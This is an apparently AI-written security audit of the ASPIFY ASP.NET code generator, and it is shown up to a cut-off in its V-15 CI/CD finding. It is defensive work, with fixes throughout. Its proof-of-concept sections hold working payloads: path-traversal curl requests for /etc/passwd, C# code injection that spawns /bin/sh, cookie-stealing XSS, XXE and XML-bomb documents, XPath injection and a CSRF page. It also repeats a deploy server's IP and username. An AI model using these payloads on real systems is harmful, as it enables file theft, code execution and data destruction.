# ASPIFY - Security Vulnerability Audit Report

**Repository:** `D3ds3c007/ASPIFY` — Code generator for ASP.NET Core (generates models & DbContext)  
**Branch:** `main` | **Framework:** `net8.0` | **Audit Date:** 2026-09-15  
**Auditor:** Arena.ai Agent (Manual SAST + Logic Review)  
**Scope:** `App/` — Controllers, Services, DTO, Templates, Views, `entity.xml`, `DockerFile`, `.github/workflows/main.yml`

---

## Executive Summary

ASPIFY is currently **critically insecure** and should **NOT be exposed to the internet** in its current state. The audit found **18 findings: 3 Critical, 6 High, 6 Medium, 3 Low**.

| Severity | Count | Action |
|---|---|---|
| **CRITICAL** | **3** | Fix immediately - remote file read/write, RCE |
| **HIGH** | **6** | Fix within 7 days - XSS, XXE, auth bypass |
| **MEDIUM** | **6** | Fix within 30 days - CSRF, headers, cache, info leak |
| **LOW** | **3** | Hardening - DoS, logging, race conditions |
| **OVERALL RISK** | **10/10** | **No authentication, unauthenticated RCE + arbitrary file read** |

> **If you deploy this today, anyone on the internet can:** read `/etc/passwd`, `entity.xml`, `appsettings.json` via path traversal; delete arbitrary files; inject C# code that gets written to `wwwroot/download/models/*.cs` and compiled into your DB context; steal your `postgres/password=root` DB; XSS all your users; wipe your XML database via XPath injection.

---

## Risk Matrix

| ID | Title | Severity | CVSS 3.1 | CWE | OWASP 2021 | Exploitability |
|---|---|---|---|---|---|---|
| **V-01** | **Path Traversal → Arbitrary File Read** | **Critical** | **9.1** | CWE-22, CWE-552 | A01, A05 | Trivial - curl |
| **V-02** | **Arbitrary File Write + C# Code Injection via Entity Name** | **Critical** | **9.8** | CWE-22, CWE-94, CWE-74 | A01, A03 | Trivial - POST JSON |
| **V-03** | **No Authentication/Authorization on ANY endpoint** | **Critical** | **9.8** | CWE-306, CWE-862 | A01 | Trivial |
| V-04 | Stored XSS in Entity/Property Name → DOM `innerHTML` | High | 8.2 | CWE-79 | A03 | Trivial |
| V-05 | XXE & XML Bomb (Billion Laughs) via `XmlDocument`/`XmlSerializer` | High | 8.6 | CWE-611, CWE-776 | A05 | Medium |
| V-06 | XPath Injection in `RemoveNode`/`AppendToNode` | High | 8.1 | CWE-643 | A03 | Trivial |
| V-07 | Arbitrary File Delete via `RemoveEntity` traversal | High | 7.5 | CWE-22, CWE-73 | A01 | Trivial |
| V-08 | Hardcoded DB Credentials (`postgres/root`) in template + shipped artifact | High | 7.5 | CWE-798, CWE-259 | A07 | Trivial |
| V-09 | CSRF on `add-entity` / `add-relationship` (no anti-forgery) | High | 6.5 | CWE-352 | A01 | Medium |
| V-10 | Insecure Cache: `Cache-Control: public, max-age=3600` + BREACH (`EnableForHttps=true`) | Medium | 6.3 | CWE-524, CWE-693 | A05 | Medium |
| V-11 | Sensitive Static File Exposure (`wwwroot/download/` served via `UseStaticFiles`) | Medium | 6.5 | CWE-552 | A01 | Trivial |
| V-12 | Missing Security Headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options) | Medium | 5.3 | CWE-693 | A05 | Medium |
| V-13 | Verbose Error Disclosure (`BadRequest(e.Message)` + `e.Stack`) | Medium | 5.3 | CWE-209, CWE-497 | A05 | Trivial |
| V-14 | Vulnerable/Outdated Dependency `Microsoft.AspNetCore.Rewrite 2.2.0` (EOL .NET Core 2.2) | Medium | 5.9 | CWE-937 | A06 | Low |
| V-15 | CI/CD Information Disclosure & Insecure Deploy (hardcoded IP `34.35.35.16`, `sudo ./deploy-script.sh`, `actions/cache@v2`) | Medium | 6.0 | CWE-200, CWE-829 | A06 | Low |
| V-16 | Denial of Service: unbounded XML, unbounded codegen, `Entities[0]` crash | Low | 4.3 | CWE-400, CWE-770 | A05 | Trivial |
| V-17 | Race Condition / TOCTOU on `entity.xml` (read-modify-write without lock) | Low | 3.7 | CWE-367 | A01 | Medium |
| V-18 | Log Injection via `Console.WriteLine(userInput)` | Low | 3.3 | CWE-117 | A09 | Trivial |

---

## Detailed Findings

### V-01: Path Traversal → Arbitrary File Read [CRITICAL]

**File:** `App/Controllers/DirectoryController.cs:11-14` and `57-77`  
**CWE-22, CVSS 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)**

```csharp
// List - path param is attacker-controlled
[HttpGet("list")]
public IActionResult List(string path = "") {
    string outputPath = string.IsNullOrEmpty(path) 
        ? Path.Combine("wwwroot/download/") 
        : Path.Combine("wwwroot/download/", path); // ← NO sanitization
    if (!Directory.Exists(outputPath)) return NotFound(...);
    var directories = Directory.GetDirectories(outputPath); // traverses outside
}

// Content - file param is attacker-controlled
[HttpGet("/directory/content/{file}")]
public IActionResult Content(string file="") {
    string outputPath1 = Path.Combine("wwwroot/download/models", file); // ← NO check
    string outputPath2 = Path.Combine("wwwroot/download/data/", file);
    if(File.Exists(outputPath1))
        return Ok(File.ReadAllText(outputPath1)); // ← arbitrary read
}
```

**POC:**

```bash
# 1. List parent directory - escapes sandbox
curl "https://aspify.tech/Directory/list?path=../../.."
curl "https://aspify.tech/Directory/list?path=../../App"

# 2. Read entity.xml (should be protected)
curl "https://aspify.tech/directory/content/../../entity.xml"

# 3. Read source code
curl "https://aspify.tech/directory/content/../../Controllers/GeneratorController.cs"
curl "https://aspify.tech/directory/content/../../appsettings.json"
# On Linux also:
curl "https://aspify.tech/directory/content/../../../../etc/passwd"
# On Windows:
curl "https://aspify.tech/directory/content/..%5c..%5cProgram.cs"
```

**Why it works:** `Path.Combine("wwwroot/download/models", "../../entity.xml")` → `wwwroot/download/models/../../entity.xml` which normalizes to `wwwroot/entity.xml` (one level up) - then `../../` again escapes entirely. `File.ReadAllText` resolves `..` segments.

**Impact:** 
- Read any file the app user can read: source, `entity.xml`, `wwwroot/download/Data/evalcontext.cs` (contains DB password), potentially OS files if container runs as root.
- Combined with `Explore.cshtml` which uses `fetch('content/'+fileName)` with same logic, JS-automated exfiltration is trivial.

**Remediation:**

```csharp
[HttpGet("list")]
public IActionResult List(string path = "") {
    var basePath = Path.GetFullPath(Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/download"));
    var requested = Path.GetFullPath(Path.Combine(basePath, path ?? ""));
    if (!requested.StartsWith(basePath, StringComparison.Ordinal))
        return BadRequest("Invalid path");
    // ... now safe to enumerate
}

[HttpGet("/directory/content/{file}")]
public IActionResult Content(string file="") {
    if (string.IsNullOrWhiteSpace(file) || file.Contains("..") || Path.IsPathRooted(file) 
        || file.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
        return BadRequest("Invalid file");

    var base1 = Path.GetFullPath(Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/download/models"));
    var base2 = Path.GetFullPath(Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/download/data"));
    var p1 = Path.GetFullPath(Path.Combine(base1, file));
    var p2 = Path.GetFullPath(Path.Combine(base2, file));
    // whitelist: must be inside base AND extension .cs
    if (p1.StartsWith(base1) && System.IO.File.Exists(p1) && p1.EndsWith(".cs"))
        return PhysicalFile(p1, "text/plain");
    if (p2.StartsWith(base2) && System.IO.File.Exists(p2) && p2.EndsWith(".cs"))
        return PhysicalFile(p2, "text/plain");
    return NotFound();
}
```
- Also add `UseStaticFiles` config to **disable** directory browsing and restrict `wwwroot/download` from direct HTTP serving, or move generated files **outside** `wwwroot`.

---

### V-02: Arbitrary File Write + C# Code Injection / SSTI via Entity Name [CRITICAL]

**Files:** 
- `App/Controllers/GeneratorController.cs:54-67, 69-85`
- `App/Services/T4Service.cs:28-29, 45-46`
- `App/Templates/EntityTemplate.tt:11, 18, 20, 27-35`
- `App/Templates/ContextTemplate.tt`

```csharp
// GeneratorController.AddEntity - no validation on entity.Name
public IActionResult AddEntity([FromBody] Entity entity) {
    EntityCollection ec = new(); ec.Entities.Add(entity);
    XMLService.Serialize(ec); // writes to entity.xml without sanitization
    GenerateCode(); // triggers codegen
}

// T4Service
string outputPath = Path.Combine("wwwroot/download/models/", entity.Name + ".cs");
File.WriteAllText(outputPath, classContent); // path traversal WRITE

// EntityTemplate.tt - direct interpolation
public class <#= entity.Name #>            // ← class name injection
{
    public <#= property.Type #> <#= property.Name #> { get; set; } // ← property injection
    public virtual ICollection<<#= relationship.targetEntity #>> ... // ← relation injection
}
```

**POC 1 - Path Traversal Write:**
```json
POST /generator/add-entity
Content-Type: application/json

{
  "Name": "../../App/wwwroot/js/pwned",
  "Properties": [{ "Name": "pwn", "Type": "string", "IsPk": true }]
}
```
→ Writes to `wwwroot/download/models/../../App/wwwroot/js/pwned.cs` → `App/wwwroot/js/pwned.cs` which is then served statically as `https://aspify.tech/js/pwned.cs` (or if `.js`, executable JS via XSS).  
Traversal to `../../Program.cs` would overwrite main app file (if container writable).

**POC 2 - C# Code Injection (RCE when generated code is compiled):**
```json
{
  "Name": "Evil",
  "Properties": [
    { "Name": "Pwn\", \"type\": \"string\" } \n public string Hack { get { System.Diagnostics.Process.Start(\"calc\"); return \"\"; } } //", "Type": "string", "IsPk": false }
  ]
}
```
But simpler: `Type` injection:
```json
{
  "Name": "Invoice",
  "Properties": [
    { "Name": "Amount", "Type": "string; } public void Evil(){ System.Diagnostics.Process.Start(\"/bin/sh\",\"-c id > /tmp/pwned\"); } public string Dummy { get; set; } //", "IsPk": false }
  ]
}
```
Generated output:
```csharp
public class Invoice {
    public string; } public void Evil(){ System.Diagnostics.Process.Start("/bin/sh","-c id > /tmp/pwned"); } public string Dummy { get; set; } // Amount { get; set; }
}
```
Which is valid C# that executes on next build. Since `DockerFile` runs `dotnet publish` and workflow builds/pushes, this becomes supply-chain RCE.

**Even without RCE:** `entity.Name = "  Bad Name With Spaces; DROP TABLE"` produces invalid C# causing DoS on generation (`GenerateCode()` crashes for all users).

**Remediation:**
- Strict allowlist:
```csharp
if (!Regex.IsMatch(entity.Name, @"^[A-Z][A-Za-z0-9_]{2,50}$"))
    return BadRequest("Invalid entity name. Use PascalCase letters, digits, underscore, 3-50 chars, start with uppercase.");
foreach(var p in entity.Properties) {
    if (!Regex.IsMatch(p.Name, @"^[A-Z][A-Za-z0-9_]{1,30}$")) return BadRequest(...);
    var allowedTypes = new HashSet<string>{"String","int","double","Boolean","DateTime","Point"};
    if (!allowedTypes.Contains(p.Type)) return BadRequest("Invalid type");
}
```
- In templates, HTML-encode or better use `ToStringHelper` is NOT security encoding - need C# identifier validation **before** templating.
- Use `Path.GetFileName` + whitelist: `var safeName = Path.GetFileName(entity.Name); if (safeName != entity.Name) reject;`
- Write outside `wwwroot`, or generate in-memory zip without persisting to disk under static files.

---

### V-03: Complete Absence of Authentication & Authorization [CRITICAL]

**Files:** `App/Program.cs`, all `Controllers/*.cs`, `App/Properties/launchSettings.json`

```csharp
// Program.cs
builder.Services.AddControllersWithViews(); // no AddAuthentication
var app = builder.Build();
app.UseRouting();
app.UseAuthorization(); // no UseAuthentication, no [Authorize] anywhere
app.MapControllerRoute(...);
```

```csharp
// Every controller - NO attribute
public class GeneratorController : Controller { // no [Authorize]
    [HttpPost("add-entity")] public IActionResult AddEntity(...) // anonymous
    [HttpGet("remove-entity/{name}")] // GET that deletes! (also violates REST/CSRF)
}
```

**Evidence:**
- `grep -rn Authorize App` → **0 results**
- `grep -rn Authentication App` → **0 results**
- `launchSettings.json` → `"anonymousAuthentication": true`, `"windowsAuthentication": false`
- No Identity, no JWT, no API key.

**Impact:** Anyone can:
- `GET /generator/entities` → leak all entity definitions
- `POST /generator/add-entity` → poison shared `entity.xml` (global, no per-user isolation)
- `GET /generator/remove-entity/{any}` → delete victim's models (DoS)
- `POST /relationship/add-relationship` → inject relationships
- `GET /Directory/list` + `/directory/content/{file}` → read arbitrary files
- No audit trail.

**Remediation:**
```csharp
builder.Services.AddAuthentication(Cookie... or JwtBearer...)
                .AddCookie(...);
builder.Services.AddAuthorization();
app.UseAuthentication();
app.UseAuthorization();

// Then protect:
[Authorize(Roles="Admin")]
public class GeneratorController : Controller {}

[HttpDelete("remove-entity/{name}")] // not GET
[ValidateAntiForgeryToken]
[Authorize]
```

- Per-user `entity.xml` isolation: store under `user_{id}/entity.xml` or database with `UserId` foreign key.
- Add rate limiting: `AddRateLimiter`.

---

### V-04: Stored XSS via Entity Name / Property → `innerHTML` [HIGH]

**Files:** 
- `App/Views/Generator/Entities.cshtml:277-282` (`showEntityDetails`)
- `App/Views/Generator/Entities.cshtml:164` (`newProperty.innerHTML`)
- `App/Views/Relationship/Relations.cshtml` (renders `relationName`)
- `App/Controllers/GeneratorController.cs:38` (`return Ok(entity)` returns raw name to JS)

```javascript
// Entities.cshtml:275
function showEntityDetails(entityName) {
  fetch(`/generator/entities/${entityName}`)
    .then(data => {
      entityDetails.innerHTML = ` // ← XSS sink
        <strong>Name:</strong> ${data.name}<br>
      `;
      data.properties.forEach(property => {
        entityDetails.innerHTML += `- ${property.name}: ${property.type}<br>`; // ← unsanitized
      });
      $('#entityDetailsModal').modal('show');
    })
}
// attacker creates:
{
  "Name": "<img src=x onerror=alert(document.cookie)>",
  "Properties": [{ "Name": "<svg onload=alert(1)>", "Type": "String<img onerror=alert(2) src=x>", "IsPk": false }]
}
```
When victim clicks entity name, `innerHTML` parses payload → JS executes in victim's origin → steal cookies, rewrite `entity.xml`.

**Second sink - Razor JS injection:**
```html
<!-- Entities.cshtml: foreach -->
<a onclick="showEntityDetails('@entity.Name')"> // ← if Name = `'); alert(1); //` closes string
```
Razor's `@entity.Name` is HTML-encoded but **not JS-encoded**. Payload: `c');alert(1);//` → `onclick="showEntityDetails('c');alert(1);//')"`.

**Remediation:**
- Use `textContent`, not `innerHTML`:
```javascript
entityDetails.textContent = "";
const strong = document.createElement("strong");
strong.textContent = data.name;
entityDetails.appendChild(strong);
// for properties:
const p = document.createElement("div");
p.textContent = `- ${property.name}: ${property.type}`;
entityDetails.appendChild(p);
```
- Or DOMPurify: `entityDetails.innerHTML = DOMPurify.sanitize(...)`
- Server side: validate `Name` against `^[A-Za-z0-9_]+$` (V-02) already blocks `<`.
- Razor: use `JsonSerializer.Serialize(entity.Name)` or `@Html.Raw(Json.Encode(...))` or better `data-` attributes:
```html
<a data-name="@entity.Name" onclick="showEntityDetails(this.dataset.name)">
```

---

### V-05: XXE & XML Bomb via `XmlDocument` + `XmlSerializer` [HIGH]

**Files:** `App/Services/XMLService.cs:70-71, 78-79, 100-106, 115-116`

```csharp
// Deserialize - uses XmlSerializer with default XmlReader (allows DTD)
public static EntityCollection Deserialize(string fileName) {
    XmlSerializer serializer = new XmlSerializer(typeof(EntityCollection));
    using (var reader = new StreamReader(fileName)) {
        return (EntityCollection)serializer.Deserialize(reader); // ← no XmlReaderSettings
    }
}

// AppendToNode / RemoveNode
var xmlDoc = new XmlDocument();
xmlDoc.LoadXml(File.ReadAllText(fileName)); // ← File.ReadAllText + LoadXml allows XXE
var newXmlDoc = new XmlDocument();
newXmlDoc.LoadXml(xmlContent); // xmlContent from attacker-controlled Serialize
```

**No settings found:** `grep -rn XmlReaderSettings|DtdProcessing|XmlResolver App` → empty.

**.NET behavior:** In .NET 8, `XmlDocument.XmlResolver` defaults to `null` (safe-ish for XXE) but `DtdProcessing` still defaults to `Prohibit`? However `XmlSerializer.Deserialize(StreamReader)` internally creates `XmlReader` with `DtdProcessing.Parse` if not configured, allowing internal DTD expansion → Billion Laughs DoS. Also if attacker controls `entity.xml` content via `AddEntity` (which does accept arbitrary Entity serialization), they can plant:
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;">
  ... 1M expansions ...
]>
<ArrayOfEntity>
  <Entity Name="&lol2;">
```
→ On next `Deserialize`, CPU/memory DoS.

Classic XXE payload (if resolver not null, or older .NET):
```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<ArrayOfEntity><Entity Name="&xxe;"></Entity></ArrayOfEntity>
```
If resolver enabled, reads server files and embeds into `Name` which is then displayed via `Views` (exfil via XSS).

**Remediation:**

```csharp
public static EntityCollection Deserialize(string fileName) {
    var settings = new XmlReaderSettings {
        DtdProcessing = DtdProcessing.Prohibit, // block DOCTYPE
        XmlResolver = null,
        MaxCharactersFromEntities = 1024,
        MaxCharactersInDocument = 1024 * 1024 // 1MB limit
    };
    using var reader = XmlReader.Create(fileName, settings);
    var serializer = new XmlSerializer(typeof(EntityCollection));
    return (EntityCollection)serializer.Deserialize(reader);
}

// For XmlDocument:
var settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null };
using var reader = XmlReader.Create(new StringReader(File.ReadAllText(fileName)), settings);
var xmlDoc = new XmlDocument { XmlResolver = null };
xmlDoc.Load(reader);
```

- Validate `entity.xml` size before read: `if (new FileInfo(fileName).Length > 1_000_000) throw;`
- Consider JSON instead of XML (simpler, less attack surface).

---

### V-06: XPath Injection [HIGH]

**Files:** `App/Services/XMLService.cs:74, 119`, `App/Controllers/GeneratorController.cs:77`

```csharp
// RemoveNode - string concatenation into XPath
var targetNode = root.SelectNodes($"//{targetNodeName}[@{attributeName}='{attributeValue}']");
// AppendToNode
var targetNode = root.SelectSingleNode($"//{targetNodeName}");
```

`attributeValue` comes from `GeneratorController.RemoveEntity(string name)` where `name` is URL path param: `GET /generator/remove-entity/{name}`

**POC:**
```bash
# Delete ALL entities instead of one:
curl "http://localhost:5020/generator/remove-entity/' or '1'='1"

# XPath becomes: //Entity[@Name='' or '1'='1']  → matches every Entity

# Inject to delete Relationships too:
curl "http://localhost:5020/generator/remove-entity/test'] | //Relationships | //*['"

# Escape single quote via XML trick:
# name = foo' or @Name!='  → //Entity[@Name='foo' or @Name!=''] → matches all where Name != ''
```

**Impact:** Data loss, bypass access control (if later added), can trick `AppendToNode` to append to unintended node.

**Remediation:** Don't build XPath via string concat. Use parameterized selection:

```csharp
public static void RemoveNode(string fileName, string targetNodeName, string attributeName, string attributeValue) {
    // whitelist node/attribute names
    var allowedNodes = new HashSet<string>{"Entity","Relationships"};
    var allowedAttrs = new HashSet<string>{"Name","name","type","targetEntity"};
    if (!allowedNodes.Contains(targetNodeName) || !allowedAttrs.Contains(attributeName))
        throw new ArgumentException("Invalid target");

    var xmlDoc = new XmlDocument();
    // ... safe load with settings (V-05) ...

    // Use XPath with variable via API or manual iteration (no injection)
    foreach (XmlNode node in xmlDoc.SelectNodes($"//{targetNodeName}")) { // safe, no user attr in xpath
        if (node.Attributes?[attributeName]?.Value == attributeValue) // string compare, no xpath eval
            node.ParentNode.RemoveChild(node);
    }
}
```

Or use `LINQ to XML` (`XDocument`) with LINQ queries instead of XPath strings.

---

### V-07: Arbitrary File Delete [HIGH]

**File:** `App/Controllers/GeneratorController.cs:77-79`

```csharp
[HttpGet("remove-entity/{name}")]
public IActionResult RemoveEntity(string name) {
    XMLService.RemoveNode("entity.xml", "Entity", "Name", name);
    System.IO.File.Delete("wwwroot/download/models/"+name+".cs"); // ← path traversal
    System.IO.File.Delete("wwwroot/download/data/evalcontext.cs+"); // typo '+' but still delete attempt
}
```

**POC:**
```bash
# Delete any .cs model
curl "http://localhost/generator/remove-entity/../../../../App/Program"

# Attempts: File.Delete("wwwroot/download/models/../../../../App/Program.cs")
# → deletes App/Program.cs -> DoS

# Delete entity.xml itself via traversal?
curl "http://localhost/generator/remove-entity/../../entity"
# → File.Delete("wwwroot/download/models/../../entity.cs") → wwwroot/entity.cs (not entity.xml but similar)

# Null byte? Not in .NET but still
```

Even without `..`, attacker can delete any model by guessing name: `GET /generator/remove-entity/Cutomer` → deletes `Cutomer.cs` belonging to another user.

**Remediation:** Combine V-01 + V-02 fixes: validate name via allowlist, then use `Path.GetFullPath` + StartsWith check, and use `HttpDelete` + auth so only owner can delete.

```csharp
[HttpDelete("remove-entity/{name}")]
[Authorize]
public IActionResult RemoveEntity(string name) {
    if (!Regex.IsMatch(name, @"^[A-Z][A-Za-z0-9_]{2,50}$")) return BadRequest();
    var basePath = Path.GetFullPath(Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/download/models"));
    var target = Path.GetFullPath(Path.Combine(basePath, name + ".cs"));
    if (!target.StartsWith(basePath)) return BadRequest();
    if (System.IO.File.Exists(target)) System.IO.File.Delete(target);
    // ...
}
```

Also fix bug: `"evalcontext.cs+"` trailing `+` means real file never deleted, leaving stale context.

---

### V-08: Hardcoded Database Credentials [HIGH]

**Files:** 
- `App/Templates/ContextTemplate.tt:29`
- `App/Templates/ContextTemplate.cs:54`
- `App/wwwroot/download/Data/evalcontext.cs:23` (shipped)

```csharp
protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder) {
    optionsBuilder.UseNpgsql("Host=localhost;Database=evaluation;Username=postgres;Password=root;");
    optionsBuilder.UseLazyLoadingProxies();
}
```

**Impact:**
- Password `root` committed to GitHub (public repo) → any attacker knows it.
- Every generated `evalcontext.cs` that users download contains same hardcoded creds. If they deploy as-is to production, DB is compromised.
- Docker image built via `docker build -t aspifyapp` inherits this file → image pushed to `dedsec007/aspifyapp:version1` (public Docker Hub) contains `postgres/root`.
- No `appsettings.json` secret rotation, no `User Secrets`, no `AWS Secrets Manager`/`HashiCorp Vault`.

**Remediation:**
```csharp
// ContextTemplate.tt - use configuration, not hardcoded
protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder) {
    if (!optionsBuilder.IsConfigured) {
        // read from environment / appsettings
        var conn = Environment.GetEnvironmentVariable("ASPIFY_CONNECTIONSTRING");
        if (!string.IsNullOrEmpty(conn))
            optionsBuilder.UseNpgsql(conn);
    }
    optionsBuilder.UseLazyLoadingProxies();
}
```
- Remove password from repo: `git rm --cached` + `git commit` + rotate `postgres` password immediately.
- Add `appsettings.json` with placeholder: `"ConnectionStrings": {"Default":"Host=...;Username=...;Password=${DB_PASSWORD}"}`
- Add `.gitignore` rule: `appsettings.Production.json` excluded, use `dotnet user-secrets`.
- Enable secret scanning on GitHub: Settings → Security → Secret scanning.

---

### V-09: CSRF [HIGH]

**Files:** `App/Controllers/GeneratorController.cs:54`, `App/Controllers/RelationshipController.cs:20`, `App/Views/Generator/Entities.cshtml`, `App/Views/Relationship/Relations.cshtml`

- `Program.cs` does not call `AddAntiforgery` explicitly but MVC adds it. However **no** controller validates it:
  - `[HttpPost("add-entity")]` + `[FromBody]` JSON → `ValidateAntiForgeryToken` missing
  - `fetch("/generator/add-entity", {method:"POST"})` sends **no** `RequestVerificationToken` header or cookie.
  - Same for `/relationship/add-relationship`

Also `RemoveEntity` is `GET` (should be `POST`/`DELETE`) → CSRF via `<img src="https://aspify.tech/generator/remove-entity/Cutomer">` would delete model if victim is logged in (when auth later added).

**POC:**
```html
<!-- attacker.com/pwn.html -->
<form action="https://aspify.tech/generator/add-entity" method="POST" enctype="text/plain">
  <!-- not needed for JSON, but form-submit CSRF with text/plain bypasses some checks -->
</form>
<script>
fetch("https://aspify.tech/generator/add-entity", {
  method:"POST", credentials:"include",
  headers:{"Content-Type":"application/json"},
  body: JSON.stringify({Name:"Hacked", Properties:[{Name:"x", Type:"string", IsPk:true}]})
});
</script>
```
If victim visits attacker site while logged into ASPIFY, their `entity.xml` is poisoned.

**Remediation:**
```csharp
// Program.cs
builder.Services.AddAntiforgery(o => o.HeaderName = "XSRF-TOKEN");

// Controller
[HttpPost("add-entity")]
[ValidateAntiForgeryToken]
[Authorize]
public IActionResult AddEntity([FromBody] Entity entity) {}

// View: inject token
@inject Microsoft.AspNetCore.Antiforgery.IAntiforgery Xsrf
<script>
const token = "@Xsrf.GetAndStoreTokens(Context).RequestToken";
fetch("/generator/add-entity", {
  headers: { "RequestVerificationToken": token, "Content-Type":"application/json" },
  ...
});
</script>
```
- Change `RemoveEntity` to `HttpDelete` + ValidateAntiForgeryToken.
- For JSON APIs, consider `SameSite=Strict` cookies + custom header `X-Requested-With` check.

---

### V-10: Insecure Caching & BREACH [MEDIUM]

**File:** `App/Program.cs:26-38`

```csharp
app.UseResponseCaching();
app.Use(async (context, next) => {
    context.Response.GetTypedHeaders().CacheControl =
        new CacheControlHeaderValue() { Public = true, MaxAge = TimeSpan.FromSeconds(3600) };
    context.Response.Headers[HeaderNames.Vary] = new string[] { "Accept-Encoding" };
    await next();
});
builder.Services.AddResponseCompression(options => {
    options.EnableForHttps = true; // ← BREACH
    options.Providers.Add<BrotliCompressionProvider>();
});
```

- `Public = true` for **all** responses means shared proxies (CDN, corporate) cache `Directory/list` JSON which contains directory structure, `entity.xml` contents, generated code. Authenticated responses would be leaked via cache poisoning.
- `MaxAge 3600` without `NoStore` on sensitive endpoints → data stays 1h.
- `EnableForHttps = true` with compression enables **BREACH** attack: attacker can inject guess into reflected data (entity name), observe compressed size to brute-force secret (anti-forgery token, etc.) over HTTPS.
- `UseResponseCaching` without `[ResponseCache]` attributes on controllers means even `RemoveEntity` GET could be cached (deletion via cache).

**Remediation:**
```csharp
// Remove global cache header, use per-endpoint:
[ResponseCache(NoStore = true, Location = ResponseCacheLocation.None)] // for dynamic data
public IActionResult List(...) {}

[ResponseCache(Duration=3600, Location=ResponseCacheLocation.Client)] // only for static
// ...

builder.Services.AddResponseCompression(o => o.EnableForHttps = false); // or mitigate BREACH: add random per-request token, or disable compression for sensitive endpoints
```

---

### V-11: Sensitive Static File Exposure [MEDIUM]

**File:** `App/Program.cs:31` `app.UseStaticFiles();` + `T4Service.cs:28`

- Generated files written to `wwwroot/download/models/*.cs` and `wwwroot/download/Data/evalcontext.cs` are **inside** `wwwroot` → automatically served at `https://aspify.tech/download/models/Cutomer.cs` etc. No auth.
- Anyone can enumerate: `GET /Directory/list` → get all filenames → `GET /download/models/<any>`.
- `entity.xml` is at `App/entity.xml` (not under wwwroot) but is readable via V-01 traversal; however if moved to `wwwroot` would be worse.

**Remediation:**
- Store generated code **outside** `wwwroot`, e.g., `App_Data/generated/{userId}/`
- Serve via controller with auth check:
```csharp
[Authorize]
public IActionResult Download(string file) { /* validate, then return PhysicalFile */ }
```
- Configure static files:
```csharp
app.UseStaticFiles(new StaticFileOptions {
    OnPrepareResponse = ctx => {
        if (ctx.File.Name.EndsWith(".cs")) ctx.Context.Response.Headers.Append("X-Content-Type-Options","nosniff");
        // deny access to /download
        if (ctx.Context.Request.Path.StartsWithSegments("/download")) ctx.Context.Response.StatusCode = 404;
    }
});
```

---

### V-12: Missing Security Headers [MEDIUM]

**File:** `App/Program.cs` (no header middleware)

- No `Content-Security-Policy` → XSS payloads execute unrestricted, inline scripts allowed.
- No `X-Frame-Options: DENY` or `frame-ancestors` → site can be framed for clickjacking of "Add Entity" form.
- No `X-Content-Type-Options: nosniff` → MIME sniffing XSS (e.g., attacker uploads `model.cs` with HTML, browser may interpret as HTML).
- No `Referrer-Policy`, `Permissions-Policy`.
- `UseHsts()` only in non-Development, but header not tested.

**Remediation (add middleware):**
```csharp
app.Use(async (context, next) => {
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    context.Response.Headers.Append("Referrer-Policy", "no-referrer");
    context.Response.Headers.Append("Content-Security-Policy",
        "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'");
    context.Response.Headers.Append("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
    await next();
});
```

---

### V-13: Verbose Error Disclosure [MEDIUM]

**Files:** `App/Controllers/GeneratorController.cs:35,49,60,86` etc.

```csharp
catch(Exception e) {
    return BadRequest(e.Message); // leaks FileNotFound path, XML parse errors
}
```

Example leak:
```bash
curl /generator/entities/../../nonexistent
→ 400 "Could not find file '/app/entity.xml'"
```
Attacker learns server path `/app`, `wwwroot` structure, etc.

Also `Program.cs` exception handler `UseExceptionHandler("/Home/Error")` in production leaks `Activity.Current.Id` etc but not stack; however dev mode shows detailed errors.

**Remediation:**
```csharp
catch (Exception ex) {
    _logger.LogError(ex, "Failed to deserialize entity.xml");
    return BadRequest("Invalid request. Please check input."); // generic to client
}
```
- Enable `app.UseExceptionHandler` even in Dev with custom error page.
- Log full exception server side, not to client.

---

### V-14: Vulnerable/Outdated Dependency [MEDIUM]

**File:** `App/ASPIFY MVC.csproj:8-9`

```xml
<PackageReference Include="Microsoft.AspNetCore.Rewrite" Version="2.2.0" />
<PackageReference Include="System.CodeDom" Version="8.0.0" />
```

- `Microsoft.AspNetCore.Rewrite 2.2.0` → targets **.NET Core 2.2 which is EOL since Dec 2019**, no security patches. Known CVEs: moderate. Project targets `net8.0` but still references old metapackage - should use `net8.0` framework reference (rewrites are part of `Microsoft.AspNetCore.App` shared framework, no package needed).
- `System.CodeDom 8.0.0` is current but check for updates (8.0.0 has no known CVE but pin to latest).

Also CI uses `actions/cache@v2` (deprecated, vulnerable to poison). Should be `@v4`.

**Remediation:**
```bash
dotnet remove package Microsoft.AspNetCore.Rewrite
# Rewrite is included in net8.0, just use: app.UseRewriter(...)
dotnet add package System.CodeDom --version 9.*
# Update workflow:
- uses: actions/cache@v4
- uses: docker/login-action@v3
```

Run `dotnet list package --vulnerable` and `dotnet audit` after.

---

### V-15: CI/CD Information Disclosure & Insecure Deployment [MEDIUM]

**File:** `.github/workflows/main.yml`

```yaml
- name: Set up SSH and add host to known_hosts
  run: |
    mkdir -p ~/.ssh
    echo "${{ secrets.SSH_KEY }}" | tr -d '\r' > ~/.ssh/id_rsa
    chmod 600 ~/.ssh/id_rsa
    ssh-keyscan -H 34.35.35.16 >> ~/.ssh/known_hosts  # ← hardcoded IP
- name: Deploy to server
  run: |
    ssh raitrafiorenana_rambeloson@34.35.35.16 'sudo ./deploy-script.sh' # ← hardcoded user+IP, passwordless sudo?
```

Issues:
- Hardcoded `34.35.35.16` + username `raitrafiorenana_rambeloson` in **public** repo → attacker knows target to brute force/0day.
